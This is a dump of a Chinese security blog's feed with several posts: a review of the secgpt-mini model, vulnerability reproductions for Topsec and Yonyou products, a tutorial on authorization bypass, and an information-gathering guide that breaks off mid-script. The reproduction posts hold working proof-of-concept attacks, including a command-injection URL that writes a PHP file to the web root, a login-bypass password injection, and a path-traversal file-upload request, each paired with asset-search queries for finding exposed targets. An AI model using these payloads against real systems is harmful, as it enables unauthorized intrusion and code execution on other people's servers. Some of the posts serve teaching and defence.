alt="image-20241024215704216"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215711520.png" alt="image-20241024215711520"></p><p>结束</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>针对secgpt-mini的网络安全大模型搭建以及使用</title>
    <link href="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1>    前言</h1><p>​随着人工智能技术的不断发展，它在网络安全领域中的作用也日益增加。AI可以帮助检测和识别潜在的安全威胁，提供智能的解决方案并提高安全性。然而，AI也可能导致安全漏洞，这些漏洞可能会被恶意利用或被攻击者利用来获取未授权的访问权限，从而可能导致严重后果。</p><p>​目前，许多企业正在使用AI来提升安全性，并开发了各种类型的漏洞。例如，AI算法可能会出现错误或绕过保护机制的情况，这可能导致未经授权的访问、数据泄露或甚至远程代码执行等严重问题。此外，由于AI系统是基于机器学习和大数据分析技术的，它们也可能存在数据隐私和安全问题。</p><p>​尽管AI可能带来一些安全风险，但是它可以弥补人类不足之处，并帮助我们更好地保护信息和系统免受攻击。因此，我们需要与AI合作，确保其安全可靠地使用和发布。</p><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p>搭个mini的过过瘾😘</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172410316.png" alt="image-20241020172410316"></p><h2 id="Docker一键运行"><a href="#Docker一键运行" class="headerlink" title="Docker一键运行"></a>Docker一键运行</h2><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python:slim<br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /secgpt-mini</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . /secgpt-mini</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install -i https://mirrors.ustc.edu.cn/pypi/web/simple -r requirements.txt</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">7860</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;webdemo.py&quot;</span>, <span class="hljs-string">&quot;--base_model&quot;</span>, <span class="hljs-string">&quot;/secgpt-mini/models&quot;</span>]</span><br></code></pre></div></td></tr></table></figure><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><p>克隆所需文件，包括模型</p><p>git clone <a href="https://huggingface.co/clouditera/secgpt-mini">https://huggingface.co/clouditera/secgpt-mini</a></p><p><em>如果没有模型，如果有略过，手动下载后放到models目录中</em></p><p><em><a href="https://huggingface.co/clouditera/secgpt-mini/blob/main/models/model.safetensors">https://huggingface.co/clouditera/secgpt-mini/blob/main/models/model.safetensors</a></em></p><p>然后下载所需要模块</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install -i https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/pypi/</span>web/simple -r requirements.txt<br></code></pre></div></td></tr></table></figure><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172115834.png" alt="image-20241020172115834"></p><p>下载完毕后使用命令</p><p>python .\webdemo.py –base_model .\models\ </p><p>运行，浏览器打开 <a href="http://127.0.0.1:7860/">http://127.0.0.1:7860/</a> 访问web页面</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172210661.png" alt="image-20241020172210661"></p><h1 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h1><blockquote><p>对于体验的话，每个人的感受都是不同的，我针对一些问题，分别提问，看看回答的咋样😁</p></blockquote><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>sqlmap：</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172924615.png" alt="image-20241020172924615"></p><p>回答1有点抽风，回答2正常的使用参数也是能给出来的</p><p>问了一些sql注入过滤bypass的，发现，有点蠢啊这ai</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020174050013.png" alt="image-20241020174050013"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020183714687.png" alt="image-20241020183714687"></p><p>只测试了几个php的代码，发现对于代码的理解，有点呃 ，，，，</p><h2 id="简单面试题"><a href="#简单面试题" class="headerlink" title="简单面试题"></a>简单面试题</h2><p>只能说，纯显示而已了</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020183828806.png" alt="image-20241020183828806"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020183940976.png" alt="image-20241020183940976"><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020184109992.png" alt="image-20241020184109992"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020173436414.png" alt="image-20241020173436414"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020184054324.png" alt="image-20241020184054324"></p><p>开头的前言也是这个模型生成的，只能说可以研究原理，真正使用的话，不推荐</p>]]></content>
    
    
    
    <tags>
      
      <tag>ai</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天融信-上网行为管理系统任意文件写入</title>
    <link href="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    <url>/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h1><p>测绘语句:app&#x3D;“天融信-上网行为管理系统”</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112008685.png" alt="image-20240618112008685"></p><h1 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h1><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112015416.png" alt="image-20240618112015416"></p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm"><span class="hljs-symbol">poc:</span><br>/view/IPV<span class="hljs-number">6</span>/naborTable/static_convert.php?blocks[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span>||<span class="hljs-variable">%20</span><br>echo<span class="hljs-variable">%20</span>PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>Cbase<span class="hljs-number">64</span><span class="hljs-variable">%20</span>-<br>d<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%20</span>/var/www/html/<span class="hljs-number">1</span>.php<span class="hljs-variable">%0</span>a<br><br>拼接路径访问即可，它会把<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>写到/var/www/html/<span class="hljs-number">1</span>.php中<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112033933.png" alt="image-20240618112033933"></p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112041237.png" alt="image-20240618112041237"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天融信 TopApp-LB 登陆绕过漏洞</title>
    <link href="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘:"></a>资产测绘:</h1><p>title&#x3D;“TopApp-LB 负载均衡系统”</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111811434.png" alt="image-20240618111811434"></p><h1 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h1><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111820823.png" alt="image-20240618111820823"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h1><p>账号任意输，密码: ;id</p><p>比如: 账号:aaa 密码: ;id</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111834320.png" alt="image-20240618111834320"></p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111841674.png" alt="image-20240618111841674"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用友GPR漏洞复现</title>
    <link href="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="测绘-hunter"><a href="#测绘-hunter" class="headerlink" title="测绘(hunter)"></a>测绘(hunter)</h1><p>app.name&#x3D;“用友GRP-U8 OA”</p><p><img src="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240618111534110.png" alt="image-20240618111534110"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=%2e%2e%2f&amp;filename=test.jsp&amp;filename=1.jpg</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>XXX.XXX.XXX:99<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------192386535332116664783811905534<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>263<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------192386535332116664783811905534</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;myFile&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/x-php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;%<span class="hljs-keyword">out</span>.print(&quot;test vulnerability!&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------192386535332116664783811905534--</span></span><br></code></pre></div></td></tr></table></figure><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240618111631898.png" alt="image-20240618111631898"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透-越权</title>
    <link href="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/"/>
    <url>/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="1、什么是越权？"><a href="#1、什么是越权？" class="headerlink" title="1、什么是越权？"></a>1、什么是越权？</h1><p>越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。</p><p>越权漏洞的成因主要是因为开发人员在对数据进行<strong>增、删、改、查询</strong>时对客户端请求的数据过分相信而遗漏了权限的判定。而且属于逻辑漏洞的一种，防护和检测都不好做。</p><h1 id="2、越权的分类："><a href="#2、越权的分类：" class="headerlink" title="2、越权的分类："></a>2、越权的分类：</h1><p><strong>1.水平越权</strong>：这种类型的越权就是越权其他用户，比如说你要查看一篇邮件，但是存在越权漏洞，却可以查看其他人的邮件。水平越权导致任意用户敏感信息泄露或者用户信息被恶意修改。</p><p><strong>2.垂直越权</strong>：这种类型的越权就是可以在<strong>不同身份之间越权</strong>，比如你是普通用户，但是可以越权到管理员，甚至超级管理员。这样就可以利用管理员或者超级管理员的功能。</p><p><strong>3.上下文越权</strong>：上下文越权就是说在某个程序需要执行n个步骤，而你却可以跳过其中某个步骤，直接到最后的步骤。</p><h1 id="3、在哪里容易发生越权？"><a href="#3、在哪里容易发生越权？" class="headerlink" title="3、在哪里容易发生越权？"></a>3、在哪里容易发生越权？</h1><p><strong>1.基础参数</strong>：通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 <strong>id</strong> 便可查看，当修改为他人的id号时会返回他人的信息。<strong>再比如cookie中的参数就作为用户的凭据，修改这个凭据便可以其他用户身份通过验证。</strong></p><p><strong>2.多阶段验证</strong>：多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，<strong>很多程序会在这一步不再验证用户身份</strong>，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p><p><strong>3.基于参数的访问控制</strong>：有的程序会在参数里面进行权限认证。如：<a href="http://www.aaaa.com/name=test&admin=0">www.aaaa.com/name=test&amp;admin=0</a> ，把0改为1就有了admin权限。</p><p><strong>4.链接隐藏</strong>：有的程序会把页面独立，让爬虫爬取不到，但是可以使用扫目录的方式扫到url，如果此时页面不做权限认证，就可直接访问到功能点，或者只是前端跳转，<strong>可以使用burp抓回包，然后删除js代码绕过。</strong></p><p><strong>5.越权可能存在的地方</strong>：<strong>增、删、改、查、详情、导出</strong>等功能，当有这些功能的时候提高重视，在url、post data、cookie处寻找是否有鉴权参数最关键的点就是定位鉴权参数，<strong>然后替换为其他账户鉴权参数的方法来发现越权漏洞。</strong></p><h1 id="4、如何挖掘越权漏洞："><a href="#4、如何挖掘越权漏洞：" class="headerlink" title="4、如何挖掘越权漏洞："></a>4、如何挖掘越权漏洞：</h1><p>测试水平越权漏洞一般要<strong>控制2个账号</strong>，来互相探测能否影响到对方数据，一般是使用2个浏览器，分别使用2个账号登陆，<strong>在各个功能点修改参数（get、post、cookie）观察是否会影响到另一个账号的数据。</strong> 测试垂直越权一般看是否补通过认证即可访问管理页面，或是找是否有一个参数表示身份权限是否是管理员。</p><h1 id="5、实例"><a href="#5、实例" class="headerlink" title="5、实例"></a>5、实例</h1><p>（注：实例中的目标站点漏洞修复或站点已经关闭）</p><h2 id="xx师范学院校园资讯平台存在越权漏洞："><a href="#xx师范学院校园资讯平台存在越权漏洞：" class="headerlink" title="xx师范学院校园资讯平台存在越权漏洞："></a>xx师范学院校园资讯平台存在越权漏洞：</h2><p>URL：<a href="https://175.24.xx.xx/login/">https://175.24.xx.xx/login/</a></p><p>这里注册一个账号，然后登陆</p><p>15xxxx12&#x2F;test123</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110407431.png" alt="image-20240618110407431"></p><p>登录进来后点击上方的个人信息，进入个人信息页面，查看http包，发现，cookie中存在id参数，并且参数等于某个数值</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110444508.png" alt="image-20240618110444508"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110602425.png" alt="image-20240618110602425"></p><p>尝试使用其他人的id，这里，点进其中一个人主页，URL中存在用户的id</p><p>抓包，然后将cookie的id改成51</p><p>成功越权访问他人主页</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110541980.png" alt="image-20240618110541980"></p><p>越权成功</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110618776.png" alt="image-20240618110618776"></p><p>评论，也是更改其他用户id，发送，使用他人身份发送成功</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110638016.png" alt="image-20240618110638016"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110651476.png" alt="image-20240618110651476"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110658451.png" alt="image-20240618110658451"></p><h1 id="6、越权的防护："><a href="#6、越权的防护：" class="headerlink" title="6、越权的防护："></a>6、越权的防护：</h1><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.不能只根据用户 id 参数去搜索，应该再次进行身份验证（防止水平越权）。<br><span class="hljs-number">2</span>.可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 <span class="hljs-keyword">user</span> <span class="hljs-title">信息。</span><br><span class="hljs-title">3</span>.在每个页面加载前进行权限认证（防止垂直越权）。<br><span class="hljs-number">4</span>.对有多步验证的应用，需要准确验证上一步是否通过。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>越权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透-信息收集（三）</title>
    <link href="/2024/06/18/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2024/06/18/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集其他"><a href="#信息收集其他" class="headerlink" title="信息收集其他"></a>信息收集其他</h1><h2 id="旁站和C段"><a href="#旁站和C段" class="headerlink" title="旁站和C段"></a>旁站和C段</h2><p>旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C段的基础上再收集一次旁站。</p><p>旁站是和已知目标站点在同一服务器但不同端口的站点，通过以下方法搜索到旁站后，先访问一下确定是不是自己需要的站点信息。</p><p><strong>站长之家</strong><br>同ip网站查询<a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p><p><a href="https://chapangzhan.com/">https://chapangzhan.com/</a></p><p><strong>google hacking</strong><br><a href="https://blog.csdn.net/qq_36119192/article/details/84029809">https://blog.csdn.net/qq_36119192/article/details/84029809</a></p><p><strong>网络空间搜索引擎</strong></p><p>如FOFA搜索旁站和C段</p><p>该方法效率较高，并能够直观地看到站点标题，但也有不常见端口未收录的情况，虽然这种情况很少，但之后补充资产的时候可以用下面的方法nmap扫描再收集一遍。</p><p><strong>在线c段 webscan.cc</strong><br>webscan.cc</p><p><a href="https://c.webscan.cc/">https://c.webscan.cc/</a></p><p><strong>c段利用脚本</strong></p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">pip install requests<br><br><span class="hljs-selector-id">#coding</span>:utf-<span class="hljs-number">8</span><br><br>import requests<br><br>import json<br><br>def <span class="hljs-built_in">get_c</span>(ip):<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在收集&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ip))<br><br>url=<span class="hljs-string">&quot;http://api.webscan.cc/?action=query&amp;ip=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ip)<br><br>req=requests.<span class="hljs-built_in">get</span>(url=url)<br><br>html=req.text<br><br>data=req.<span class="hljs-built_in">json</span>()<br><br>if <span class="hljs-string">&#x27;null&#x27;</span> not in html:<br><br>with <span class="hljs-built_in">open</span>(<span 